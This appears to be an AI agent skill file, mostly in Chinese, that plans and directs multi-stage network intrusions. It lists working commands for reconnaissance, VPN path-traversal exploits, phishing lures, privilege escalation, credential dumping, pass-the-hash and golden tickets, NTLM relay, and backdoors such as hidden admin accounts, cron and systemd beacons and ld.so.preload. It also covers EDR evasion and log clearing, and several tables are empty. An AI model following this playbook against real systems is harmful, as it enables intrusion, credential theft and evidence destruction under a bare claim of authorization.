---
name: attack-chain
description: Use for authorized multi-stage attack-path planning and orchestration when a task spans reconnaissance, initial access, privilege escalation, lateral movement, or impact assessment. Route single-stage tasks directly to their specialist skill.
---
# Attack Chain Orchestration Skill


---


|------|--------------|


---


```
用户提出多阶段任务
    ↓
attack-chain/SKILL.md（本文件）
    ↓ 规划攻击路径、确定阶段顺序
    ↓ 评估每阶段所需工具和方法
    ↓
分发到具体子 Skill 执行：
    ├── pentest-tools/     → 工具调用、漏洞利用
    ├── apk-reverse/       → 移动端渗透
    ├── js-reverse/        → Web 前端突破
    ├── reverse-engineering/ → 二进制分析
    ├── ida-reverse/       → 深度逆向
    └── browser-automation/ → 自动化操作
    ↓
每阶段完成后回到本 Skill 评估下一步
    ↓
全部完成 → docs-generator 生成报告
```


```
拿到目标后：
1. 目标是什么？（Web/内网/云/移动/IoT）
2. 当前有什么？（外部视角/已有凭据/已有据点）
3. 最终目标是什么？（域控/数据/特定系统/证明影响）
4. 约束条件？（时间/隐蔽性/不可触碰的系统）
    ↓
根据以上信息规划最短路径
    ↓
一条路走不通 → 回到本 Skill 重新规划备选路径
```

---


---


```bash
# 子公司关联域名发现
subfinder -d target.com -o subdomains.txt
amass enum -d target.com -passive -o amass_results.txt

# 合并去重
cat subdomains.txt amass_results.txt | sort -u > all_subs.txt

# 存活探测
httpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt

# 端口扫描（全端口）
naabu -l all_subs.txt -top-ports 1000 -o ports.txt
nmap -sV -sC -iL targets.txt -oA nmap_results
```


```bash
# GitHub 搜索
# org:Company filename:.env password
# org:Company filename:config.yml secret
# org:Company "jdbc:mysql" password

# Google Dork
# site:target.com filetype:sql
# site:target.com inurl:admin
# site:target.com ext:conf|cfg|ini

# JS 文件中的 API Key
cat js_urls.txt | while read url; do
  curl -s "$url" | grep -oP '(api[_-]?key|secret|token|password)\s*[:=]\s*["\047][^"\047]+'
done
```


```
{姓名拼音}{年份}       → zhangsan2024
{姓名首字母}{部门缩写}  → zs_dev
{工号}@{域名}          → 10086@target.com
{姓名}{常见后缀}       → zhangsan@123, zhangsan!@#
```


```bash
# Web 指纹
whatweb -i alive.txt --log-json=fingerprint.json
httpx -l alive.txt -tech-detect -json -o tech.json

# 特定框架探测
nuclei -l alive.txt -tags tech -severity info -o tech_results.txt

# CMS 识别
wpscan --url https://target.com --enumerate p,t,u
```

---


|---------|---------|---------|

```bash
# SQL 注入自动化
sqlmap -u "https://target.com/api?id=1" --batch --dbs --random-agent

# SSTI 检测
sstimap -u "https://target.com/search?q=test"

# Nuclei 批量扫描
nuclei -l alive.txt -severity critical,high -tags cve,sqli,rce -o vulns.txt
```


```
主题模板：
- [紧急] VPN 证书即将过期，请立即更新
- [IT通知] 邮箱存储空间不足，请清理
- [HR] 2024年度绩效考核结果查询
- [财务] 报销系统升级，请重新登录确认
```


|------|------|------|

```bash
# Fluxion WiFi 钓鱼
fluxion  # 交互式选择目标 AP → 创建伪造热点 → 捕获 WPA 密码

# BadUSB 联动 Cobalt Strike
# 通过 USB 注入 PowerShell 下载器 → 上线 C2
```


```bash
# Pulse Secure VPN（CVE-2019-11510）
curl -k "https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/"

# Fortinet VPN（CVE-2018-13379）
curl -k "https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession"

# 通用：密码喷洒
hydra -L users.txt -P passwords.txt vpn.target.com https-form-post
```


```bash
# AWS S3 桶枚举
aws s3 ls s3://target-bucket --no-sign-request

# 云元数据 SSRF
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Azure AD 密码喷洒
# 使用 MSOLSpray / Spray 工具
```

---


|------|------|------|

```powershell
# 检测 SeImpersonate
whoami /priv | findstr "SeImpersonate"

# Potato 提权
.\GodPotato.exe -cmd "cmd /c whoami"

# 自动化检测
.\winPEAS.exe
```


```bash
# SUID 检测
find / -perm -4000 -type f 2>/dev/null

# sudo 滥用
sudo -l
# 常见可利用：vim, find, python, nmap, less, awk, perl

# sudo vim 提权
sudo vim -c ':!/bin/bash'

# sudo find 提权
sudo find / -exec /bin/bash \;

# 内核漏洞
uname -r  # 检查版本
# DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)

# 自动化检测
./linpeas.sh
```


```sql
-- MSSQL xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

-- MySQL UDF 提权
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
SELECT sys_exec('id');

-- PostgreSQL
COPY (SELECT '') TO PROGRAM 'id';
```


```bash
# AWS IAM 枚举
aws iam list-attached-user-policies --user-name compromised-user
# 寻找 iam:PassRole + lambda:CreateFunction → 管理员权限

# Azure AD
# 全局管理员 → 所有订阅控制
# 应用管理员 → 添加凭据到服务主体
```

---


```bash
# Mimikatz（Windows）
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt

# Linux 凭据
cat /etc/shadow
cat ~/.bash_history | grep -i pass
find / -name "*.conf" -exec grep -l "password" {} \;

# NTLM Hash 提取
secretsdump.py domain/user:password@dc_ip
```

### 4.2 Pass-the-Hash / Pass-the-Ticket

```bash
# PTH 横向
crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec

# Kerberoasting
GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password

# AS-REP Roasting
GetNPUsers.py domain/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1

# 金票据
mimikatz# kerberos::golden /user:Administrator /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt
```


```bash
# WMI 无文件执行
wmiexec.py domain/admin:password@target_ip "whoami"

# DCOM 远程执行
dcomexec.py domain/admin:password@target_ip "whoami"

# WinRM
evil-winrm -i target_ip -u admin -H <NTLM_HASH>

# PsExec（会留痕）
psexec.py domain/admin:password@target_ip

# SSH 隧道（Linux 环境）
ssh -D 1080 user@pivot_host  # SOCKS 代理
ssh -L 3389:internal_host:3389 user@pivot_host  # 端口转发
```

### 4.4 NTLM Relay

```bash
# 关闭 Responder 的 SMB/HTTP
# 编辑 Responder.conf: SMB = Off, HTTP = Off

# 启动 Responder 捕获
responder -I eth0

# NTLM Relay 到目标
ntlmrelayx.py -tf targets.txt -smb2support

# Coercer 强制认证
coercer coerce -u user -p password -d domain -l attacker_ip -t dc_ip
```


```bash
# BloodHound 数据收集
bloodhound-python -d domain.local -u user -p password -c All -ns dc_ip

# 常见攻击路径：
# 1. 用户 → GenericAll → 目标用户 → 重置密码
# 2. 用户 → WriteDacl → 目标 OU → 添加权限
# 3. 计算机 → 约束委派 → 模拟任意用户
# 4. 用户 → DCSync 权限 → 导出所有 Hash

# Certipy AD CS 攻击
certipy find -u user@domain -p password -dc-ip dc_ip
certipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate
```

---


|------|:---:|:---:|

```powershell
# WMI 事件订阅（高隐蔽）
$Filter = Set-WmiInstance -Class __EventFilter -Arguments @{
    Name = "CoreFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
}

# 影子账户
net user support$ P@ssw0rd /add /active:yes
net localgroup administrators support$ /add
# 修改注册表 F 值克隆 RID
```


```bash
# SSH 密钥植入
echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys

# Crontab 后门
(crontab -l; echo "*/5 * * * * /tmp/.hidden/beacon") | crontab -

# LD_PRELOAD 劫持
echo "/tmp/.hidden/evil.so" > /etc/ld.so.preload

# PAM 后门
# 修改 pam_unix.so 添加万能密码

# Systemd 服务
cat > /etc/systemd/system/update.service << 'EOF'
[Unit]
Description=System Update Service
[Service]
ExecStart=/tmp/.hidden/beacon
Restart=always
[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service
```


```bash
# AWS Lambda 后门
# 创建定时触发的 Lambda 函数，回连 C2

# Azure AD 应用注册
# 创建应用 → 添加密钥凭据 → 授予 Graph API 权限

# 容器后门
# 修改基础镜像 → 所有新容器自带后门
```

---


|------|------|------|


```
1. Shellcode 加载器自定义（不用公开工具）
2. 系统调用直接调用（绕过 ntdll hook）
3. 进程注入选择低监控进程（如 RuntimeBroker.exe）
4. C2 流量走 HTTPS + 域前置 / Cloudflare Workers
5. 内存中执行，不落盘（Fileless）
6. 利用合法签名程序加载（LOLBins）
```


|------|------|---------|

---


```bash
# Windows 日志清除
wevtutil cl Security
wevtutil cl System
wevtutil cl Application

# Linux 日志清除
echo > /var/log/auth.log
echo > /var/log/syslog
history -c && history -w

# 时间戳修改
touch -t 202301010000 /path/to/file

# 内存清理
# 确保 Mimikatz dump 已删除
# 确保 C2 beacon 已退出
# 确保临时文件已清除
```

---


|---------|------|------|

---


`subfinder` `amass` `httpx` `naabu` `katana` `gau` `dnsx` `nmap` `whatweb` `wpscan`

`nuclei` `sqlmap` `sstimap` `xsstrike` `burpsuite` `metasploit`

`winPEAS` `linpeas` `GodPotato` `PrintSpoofer` `watson`

`mimikatz` `crackmapexec/netexec` `impacket` `bloodhound` `certipy` `coercer` `responder` `evil-winrm`

`cobalt-strike` `sliver` `havoc` `mythic` `adaptixc2`

`fluxion` `aircrack-ng` `proxmark3` `rubber-ducky` `wifi-pineapple`

---


|------|--------|
